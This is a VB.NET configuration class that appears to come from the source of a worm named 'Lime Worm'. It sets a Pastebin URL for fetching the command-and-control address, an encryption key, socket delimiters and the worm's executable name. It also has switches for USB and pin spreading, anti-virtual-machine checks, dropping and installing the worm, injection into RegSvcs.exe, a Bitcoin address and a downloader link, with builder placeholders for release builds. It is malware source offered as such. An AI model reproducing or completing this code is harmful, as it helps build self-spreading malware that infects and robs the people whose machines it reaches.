Public Class C_Settings

    'For testing using VS run as debug

#If DEBUG Then
    Public Shared Pastebin As String = "https://pastebin.com/raw/DDTVwwbu" ' IP:PORT
    Public Shared HOST As String 'IP
    Public Shared PORT As Integer 'PORT
    Public Shared PASS As String = "NYANCAT" 'encryption/decryption key
    Public Shared KEY As String = "|'N'|" 'socket key
    Public Shared SPL As String = "|'L'|" 'split bytes
    Public Shared EXE As String = "WORM.exe" 'worm name
    Public Shared NMT As Threading.Mutex = Nothing ' mutex
    Public Shared MTX As String = "_Lime_Worm_" 'mutex
    Public Shared USB As Boolean = False 'usb spread
    Public Shared PIN As Boolean = False 'pin spread
    Public Shared ANTI As Boolean = False 'anti virtual machines
    Public Shared DROP As Boolean = False 'drop and install worm
    Public Shared INJ_CHK As Boolean = False 'injection
    Public Shared INJ_Name As String = "RegSvcs.exe" 'injection file
    Public Shared PATH1 As String = "Temp" 'Main Folder
    Public Shared PATH2 As String = "Lime" 'Sub Folder
    Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
    Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890" 'Bitcoin address
    Public Shared DWN_CHK As Boolean = True 'downloader once
    Public Shared DWN_LINK As String = "http://mirror2.internetdownloadmanager.com/idman630build8.exe" 'downloader link
#Else
    Public Shared Pastebin As String = "%Pastebin%"
    Public Shared HOST As String
    Public Shared PORT As Integer
    Public Shared PASS As String = "%PASS%"
    Public Shared KEY As String = "%KEY%"
    Public Shared SPL As String = "%SPL%"
    Public Shared EXE As String = "%EXE%"
    Public Shared NMT As Threading.Mutex = Nothing
    Public Shared MTX As String = "_Lime_Worm_"
    Public Shared USB As Boolean = "%USB%"
    Public Shared PIN As Boolean = "%PIN%"
    Public Shared ANTI As Boolean = "%ANTI%"
    Public Shared DROP As Boolean = "%DROP%"
    Public Shared INJ_CHK As Boolean = "%INJ_CHK%"
    Public Shared INJ_Name As String = "%INJ_NAME%"
    Public Shared PATH1 As String = "%PATH1%"
    Public Shared PATH2 As String = "%PATH2%"
    Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
    Public Shared BTC_ADDR As String = "%BTC_ADDR%"
    Public Shared DWN_CHK As Boolean = "%DWN_CHK%"
    Public Shared DWN_LINK As String = "%DWN_LINK%"
#End If

End Class
